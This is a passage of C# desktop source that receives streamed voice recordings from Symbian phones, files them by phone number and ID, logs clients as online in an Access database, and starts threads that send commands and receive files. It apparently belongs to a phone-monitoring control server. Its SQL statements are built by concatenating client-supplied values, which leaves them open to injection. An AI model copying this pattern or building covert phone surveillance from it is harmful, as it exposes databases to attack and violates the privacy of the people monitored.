                        }//end of onetime
                        else
                        {
                         //   Byte[] receiveBytes = receive.Receive(ref RemoteIPEndPoint);//接受远程节点的发送数据
                            Byte[] receiveBytes = new Byte[1400];
                            symbiany.Receive(receiveBytes, receiveBytes.Length, 0);

                            if (FileNow == null)
                                break;
                            toolStripStatusLabel1.Text = "Symbian语音接收";
                            RecordS(receiveBytes);//语音记录保存

                            if (flag == 1)
                            {//写2 
                                if (!File.Exists(MyFileName2))
                                    CreatFileHead(MyFileName2);
                                FileInfo f2 = new FileInfo(MyFileName2);
                                j = Int32.Parse(f2.Length.ToString());
                                fs2 = new FileStream(MyFileName2, FileMode.Append);
                                wb2 = new BinaryWriter(fs2);
                                wb2.Write(receiveBytes);
                                wb2.Flush();
                                wb2.Close();
                                //fs2.Flush();
                                fs2.Close();
                                
                            }
                            else 
                            {//写1
                                if (!File.Exists(MyFileName))
                                    CreatFileHead(MyFileName);
                                FileInfo f1 = new FileInfo(MyFileName);
                                fs1 = new FileStream(MyFileName, FileMode.Append);
                                wb1 = new BinaryWriter(fs1);
                                wb1.Write(receiveBytes);
                                wb1.Flush();
                                wb1.Close();
                                //fs1.Flush();
                                fs1.Close();
                            }

                            if (flag == 1)//1 ing
                            {
                                FileInfo f1 = new FileInfo(MyFileName2);
                                int i1 = Int32.Parse(f1.Length.ToString());
                                if (i1 < 5 * 1024)
                                    continue;

                                if (!File.Exists(MyFileName11))//1不存在，开始播2
                                {
                                    File.Delete(MyFileName);//删掉1.amr
                                    string path = AppDomain.CurrentDomain.BaseDirectory + "test.exe";
                                    System.Diagnostics.Process.Start(path);
                                    Thread.Sleep(4000);  //0221


                                    System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName21);
                                    flag = 2;
                                }
                            }
                            else if (flag == 2)
                            {
                                FileInfo f1 = new FileInfo(MyFileName);
                                int  i1 = Int32.Parse(f1.Length.ToString());
                                if (i1 < 5 * 1024)
                                    continue;

                                if (!File.Exists(MyFileName21))   //2不存在，开始播1                
                                {

                                    File.Delete(MyFileName2);//删掉2.amr

                                    string path = AppDomain.CurrentDomain.BaseDirectory + "test1.exe";
                                    System.Diagnostics.Process.Start(path);
                                    Thread.Sleep(4000); 

                                    System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName11);
                                    flag = 1;

                                }
                            }
                        }                      
                    }//end of while
                }
                catch //(Exception e)
                {
                   // MessageBox.Show(e.ToString());

                   // if (receive != null)
                    //    receive.Close();
                    toolStripStatusLabel1.Text = "Symbian语音停止";
                }
            }//end of while     
        }//end of func   
        string path;
        int TempName = 0;
        
        public void playvoice1() //20110108原始函数
        {
            
            while (true)
           {                
                try
                {
                   Thread.Sleep(1000);
                   if(play==1)
                    {                  
                        
                        string path = AppDomain.CurrentDomain.BaseDirectory + "test1.exe";
                        System.Diagnostics.Process.Start(path);
                        

                        /*TempName++;
                        String TempFile = "E:\\" + TempName + ".amr";
                        File.Copy(MyFileName, TempFile);*/
                        Thread.Sleep(3000);
                       

                        Process newProc = System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName11);                     
                        
                        play = 0;                  
                        newProc.WaitForExit();

                      
                       
                      
                    }
                  if (play==2)
                    {                  

                        string path = AppDomain.CurrentDomain.BaseDirectory + "test.exe";
                        System.Diagnostics.Process.Start(path);
                      

                       /* TempName++;
                        String TempFile = "E:\\" + TempName + ".amr";
                        File.Copy(MyFileName2, TempFile);*/
                        Thread.Sleep(3000);
                        
                        Process newProc1 = System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName21);

                        play = 0;
                        newProc1.WaitForExit();

                        
                    }
                }
                catch 
                {
                }
           }
        }      
       // Symbian语音播放
        private WaveLib.WaveOutPlayer m_Player;
        private WaveLib.WaveFormat m_Format;
        private Stream m_AudioStream;
        bool Over = true;

        private void Filler(IntPtr data, int size)
        {
            byte[] b = new byte[size];
            if (m_AudioStream != null)
            {
                int pos = 0;
                while (pos < size)
                {
                    int toget = size - pos;
                    int got = m_AudioStream.Read(b, pos, toget);
                    if (got < toget)
                    //  m_AudioStream.Position = 0; // loop if the file ends
                    {
                            Over = true;                       
                            switch (play)
                            {
                                case 1:
                                    play = 2;
                         //           File.Delete(MyFileName);
                         //           File.Delete(MyFileName11); 
                                    sign = 1;                                                                
                                    break;
                                case 2:
                                    play = 1;
                            //        File.Delete(MyFileName2);
                            //        File.Delete(MyFileName21);
                                    sign = 2;                                
                                    break;
                            }

                            break;

                      }
                        
                    
                    pos += got;
                }
            }
            else
            {
                for (int i = 0; i < b.Length; i++)
                    b[i] = 0;
            }
            System.Runtime.InteropServices.Marshal.Copy(b, 0, data, size);
        }

        private void Stop()
        {
            if (m_Player != null)
                try
                {
                    m_Player.Dispose();
                }
                finally
                {
                    m_Player = null;
                }
        }

        private void Play(string FileName)
        {
            OpenFile(FileName);
            Stop();
            if (m_AudioStream != null)
            {
                m_AudioStream.Position = 0;
                m_Player = new WaveLib.WaveOutPlayer(-1, m_Format, 16384, 3, new WaveLib.BufferFillEventHandler(Filler));
            }
        }

        private void CloseFile()
        {
            Stop();
            if (m_AudioStream != null)
                try
                {
                    m_AudioStream.Close();
                }
                finally
                {
                    m_AudioStream = null;
                }
        }

        private void OpenFile(string FileName)
        {
            
            
                CloseFile();
                try
                {
                    WaveLib.WaveStream S = new WaveLib.WaveStream(FileName);
                    if (S.Length <= 0)
                        throw new Exception("Invalid WAV file");
                    m_Format = S.Format;
                    if (m_Format.wFormatTag != (short)WaveLib.WaveFormats.Pcm && m_Format.wFormatTag != (short)WaveLib.WaveFormats.Float)
                        throw new Exception("Olny PCM files are supported");

                    m_AudioStream = S;
                }
                catch //(Exception e)
                {
                    CloseFile();
                   // MessageBox.Show(e.Message);
                }
          }
        
        
       
        //Symbian录音保存的函数
        public void FileVoiceCreate(string PhoneID, string PhoneNum,string OS)
        {
            //在Debug\ReceviceFile\Voice中建立一个以当前日期命名的文件夹
           // string RTime = System.DateTime.Now.ToShortDateString();
            string RTime = System.DateTime.Now.ToString("yyyy-MM-dd");
            string fileSub = "Voice\\" + RTime;
            string path = FileCreateSub(fileSub);

            //文件命名 时间获取   文件格式 34567890@1342222222@2011-2-16 20;59;08.amr
            //string TimeFull = System.DateTime.Now.ToString();
            string TimeFull = System.DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss");
            string Name = TimeFull.Replace(':', ';');

            //创建文件，并预先写入头文件
            if (OS.CompareTo("Symbian") == 0)
            {
                string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".amr";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;
                CreatFileHead(FileNow);
            }
            else if (OS.CompareTo("Mobile") == 0)
            {
                string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;            
            }
            else if (OS.CompareTo("Android") == 0)
            { 
            
            
            }

        }
        public void RecordS(Byte[] receiveBytes)
        {
            FileStream fs = new FileStream(FileNow, FileMode.Append);
            BinaryWriter wb = new BinaryWriter(fs);
            wb.Write(receiveBytes);
            wb.Close();
            fs.Close();
        }

        public void CreatFileHead(string MyFileName)  //创建一个文件，并预先写入AMR的二进制的头
        {

            byte[] KAMRNBHeader ={ 0x23, 0x21, 0x41, 0x4d, 0x52, 0x0a };

            FileStream fs = new FileStream(MyFileName, FileMode.Create);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(KAMRNBHeader);
            bw.Close();
            fs.Close();
        }

        public void CreatFileHeadM(string MyFileName)  //创建一个文件，并预先写入MAV的二进制的头
        {          

            byte[] KAMRNBHeader ={ 0x23, 0x21, 0x41, 0x4d, 0x52, 0x0a };

            FileStream fs = new FileStream(MyFileName, FileMode.Create);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(KAMRNBHeader);
            bw.Close();
            fs.Close();
        }


        #endregion

        Thread TempThread;
        Thread ThreadTrany;
        Thread sendMy;

        public void login() //控制端上线，通知第三方
        {
            sendMy = new Thread(new ThreadStart(loginT));
            sendMy.IsBackground = true;
            sendMy.Start();
        }
        private void TOrder()  //命令的发送
        {
            ThreadTrany = new Thread(new ThreadStart(Order));
            ThreadTrany.IsBackground = true;
            ThreadTrany.Start();
            if (this.IsDisposed)
                return;

        }
        private void Recevice()  //文件的接收
        {
            lis = true;
            TempThread = new Thread(new ThreadStart(this.StartReceive));
            TempThread.IsBackground = true;
            TempThread.Start();
            toolStripStatusLabel1.Text = "正在监听。。。";



        }

        public string FileCreateSub(string file)
        {
            //创建每个手机对应的文件夹
            string path = AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile//" + file;
            if (Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile//" + file))
            {
                //  MessageBox.Show("directory exists");  //C#创建文件夹  
            }
            else
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile//" + file);
                // MessageBox.Show("done");
            }
            return path;

        }
        public void ClientOnline(string PhoneNum, string PhoneID,string OS)
        {
            string PhoneNumO, PhoneIDO, TimeO, FlagO,OSO;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client ";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            string ComTime = System.DateTime.Now.ToString();
            string Flag = "On";
            bool hv = false;
            while (datareader.Read())
            {

                PhoneNumO = datareader["PhoneNum"].ToString();
                PhoneIDO = datareader["PhoneID"].ToString();
                TimeO = datareader["SendTime"].ToString();
                FlagO = datareader["Flag"].ToString();
                OSO = datareader["OS"].ToString();
                string sqlT = "update Client set Flag ='" + "On" + "', SendTime = '" + ComTime + "',OS='" + OS + "'where  PhoneID = '" + PhoneIDO + "'and PhoneNum='" + PhoneNumO + "'";
                if (PhoneNumO.CompareTo(PhoneNum) == 0 && PhoneIDO.CompareTo(PhoneID) == 0 && OSO.CompareTo(OS) == 0)
                {
                    OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                    myCmd1.ExecuteNonQuery();
                    hv = true;

                }

            }
            conn.Close();

            if (hv == false)  //没有记录时
            {

                string sqlI = "insert into client (PhoneNum,PhoneID,SendTime,Flag,OS) values('" + PhoneNum + "','" + PhoneID + "','" + ComTime + "','" + Flag + "','" + OS + "')";
                IntoDatabase1(PhoneNum, PhoneID, ComTime, Flag,OS, sqlI);
            }

        }


        private void timer2_Tick(object sender, EventArgs e)
        {
            GetTreeTest();

        }

        #region 加载文档管理的树状结构
        private void jiazai()
        {
            /*string[] drives = Directory.GetLogicalDrives();//得到本机上的驱动器
            foreach (string drive in drives)//循环
            {
                MyNode mn = new MyNode(drive, true);
                this.treeView9.Nodes.Add(mn);//添加驱动器名到TREEVIEW控件上
            }*/

            //得到接收文件的目录
            string ReceviceFile = AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile";
            
            MyNode mn = new MyNode(ReceviceFile, true);
            this.treeView9.Nodes.Clear();//0222
            this.listView4.Clear();//0222
            this.treeView9.Nodes.Add(mn);


            this.listView4.Columns.Add("名称", this.listView4.Width / 3, HorizontalAlignment.Center);
            this.listView4.Columns.Add("大小", this.listView4.Width / 4, HorizontalAlignment.Center);
            this.listView4.Columns.Add("类型", this.listView4.Width / 6, HorizontalAlignment.Center);
            this.listView4.Columns.Add("修改时间", this.listView4.Width / 6, HorizontalAlignment.Center);
            this.listView4.Columns.Add("保存位置", this.listView4.Width / 6, HorizontalAlignment.Center);
            this.listView4.View = View.Details;
        }   

       

        private void treeView9_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                this.listView4.Items.Clear();

                MyNode mn = (MyNode)e.Node;
                if (mn.isLoadFiles == false && mn.Nodes.Count == 0)               
                {
                    DirectoryInfo di = new DirectoryInfo(mn.MyPath);
                    this.listView4.Items.Clear();

                 //  for(int i=0;i<treeView9.Nodes.Count-1;i++)
                   // this.treeView9.Nodes[1].Remove();

                    foreach (DirectoryInfo d in di.GetDirectories())//如果为文件夹
                    {
                        mn.Nodes.Add(new MyNode(d.FullName, false));
                        ListViewItem lvi = this.listView4.Items.Add(d.Name);
                        lvi.SubItems.Add("");
                        lvi.SubItems.Add("文件夹");
                        lvi.SubItems.Add(d.LastAccessTime.ToString());
                        lvi.SubItems.Add(d.FullName);                        
                        lvi.ImageIndex = 18;//设置图标

                    }
                    foreach (FileInfo f in di.GetFiles())//如果为文件
                    {

                        ListViewItem lvi = this.listView4.Items.Add(f.Name, 0);//加载文件名及图标

                        float temp2 = 0;
                        string t;
                        float TotalSize = (float)f.Length;
                        float temp1 = TotalSize / 1024;


                        if (temp1 > 1024)
                        {
                            temp2 = temp1 / 1024;

                            t = temp2.ToString() + "MB";

                        }
                        else if (temp1 < 1)
                        {
                            t = "1KB";
                        }
                        else t = temp1.ToString() + "KB";


                        lvi.SubItems.Add(t);
                        lvi.SubItems.Add("文件");
                        lvi.SubItems.Add(f.LastAccessTime.ToString());
                        lvi.SubItems.Add(f.FullName);
                    }
                }
            }
            catch
            {
            }
        }

        private void treeView9_AfterCheck(object sender, TreeViewEventArgs e)
        {
            //   TreeNode tnx=e.Node;//获取选中的树节点
            //   foreach(TreeNode t in tnx.Nodes)//循环这个节点下的子节点
            //   {
            //    t.Checked=e.Node.Checked;//选中所有的子节点
            //   }

            //上下两段代码可以任选其一测试

            bool isChecked = true;//定义一个BOOL值

            TreeNode parentNode = e.Node.Parent;//得到当前选中的节点的父节点
            if (parentNode == null)//如果没有父节点 则返回
                return;
            TreeNode tn = parentNode.FirstNode;//得到父节点的的一个节点
            while (tn != null)//如果不为空
            {
                if (tn.Checked == false)//如果此节点没有选中
                {
                    isChecked = false;//BOOL为FALSE
                    break;//跳出
                }
                tn = tn.NextNode;//移至下一个节点
            }
            parentNode.Checked = isChecked;//根据BOOL值判断父节点是否选中
        }

        private void listView4_DoubleClick(object sender, EventArgs e)   //文档管理列表文件双击打开
        {
           
            string filename = listView4.SelectedItems[0].SubItems[4].Text;
            System.Diagnostics.Process.Start(filename);
        }

        #endregion

        #region 检测文件夹变化的函数
        public void FileWatcher()
          { 
          FileSystemWatcher FileWatcher = new FileSystemWatcher ();
          string WatcherPath= AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile";
          FileWatcher.Filter = "*.*"; //设定监听的文件类型
          FileWatcher.Path = WatcherPath; //设定监听的目录         
              FileWatcher.Changed += new FileSystemEventHandler(FileWatcher_Changed); //Changed 事件处理
            FileWatcher.Renamed += new RenamedEventHandler(FileWatcher_Renamed);//Renamed事件处理
            FileWatcher.Created += new FileSystemEventHandler(FileWatcher_Created);//Created事件处理
            FileWatcher.Deleted += new FileSystemEventHandler(FileWatcher_Deleted);//Deleted事件处理


 
          FileWatcher.IncludeSubdirectories = true;//设置监听子目录
          FileWatcher.EnableRaisingEvents = true;//开始进行监听（其实此处是标示是否进行事件监听和抛出）

          }
          void FileWatcher_Changed(object sender, FileSystemEventArgs e)
          {
             jiazai();
          }
        void FileWatcher_Deleted(object sender, FileSystemEventArgs e)
        {
            jiazai();
        }

        void FileWatcher_Created(object sender, FileSystemEventArgs e)
        {
            jiazai();
        }

        void FileWatcher_Renamed(object sender, RenamedEventArgs e)
        {
            jiazai();
        }

        #endregion

        #region   右键删除或者键盘delete删除
        private void contextMenuStrip1_Click(object sender, EventArgs e)
        {
            contextMenuStrip1.Hide();
            DeleteFile();
        }

        private void listView4_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                DeleteFile();
            }
        }
        public void DeleteFile()
        {

            if (listView4.SelectedItems.Count != 0)
            {
                if (MessageBox.Show("确认删除？", "此删除不可恢复", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    int count = listView4.SelectedItems.Count;
                    for (int i = 0; i < count; i++)
                    {
                        string path = listView4.SelectedItems[0].SubItems[4].Text;

                        if (listView4.SelectedItems[0].SubItems[2].Text.CompareTo("文件夹") == 0) //删除整个文件夹
                        {
                            FileControl.DeleteFiles(path, true);
                            listView4.SelectedItems[0].Remove();
                        }
                        else
                        {

                            File.Delete(path);
                            listView4.SelectedItems[0].Remove();

                        }
                    }
                    
                }
            }
        }
        #endregion

        #region 一个继承TreeNode的类
        public class MyNode : TreeNode
        {
            public string mytext = null;
            public bool isLoadFiles = false;
            public MyNode(string text, bool isRoot)
            {
                mytext = text;
                if (isRoot)//这里执行是查找本机驱动器的时候执行
                {
                    //base.Text = text.Substring(0, text.LastIndexOf("\\") - 1);
                    base.Text = text; //text.Substring(0, text.LastIndexOf("\\") );
                }
                else//这里执行是查找本机文件夹以及文件的时候执行
                {
                    base.Text = text.Substring(text.LastIndexOf("\\") + 1);
                }
            }
            public string MyPath
            {
                get
                {
                    return mytext;
                }
            }
        }

        #endregion
        private void treeView2_AfterSelect_1(object sender, TreeViewEventArgs e)
        {
            SelectBefore = treeView2.SelectedNode.Text;
        }

        private void tabControl1_Selected(object sender, TabControlEventArgs e)
        {
            if (tabControl1.SelectedTab == tabPage13)
                jiazai();
        }

        
       
    }
}

        
       

       
      
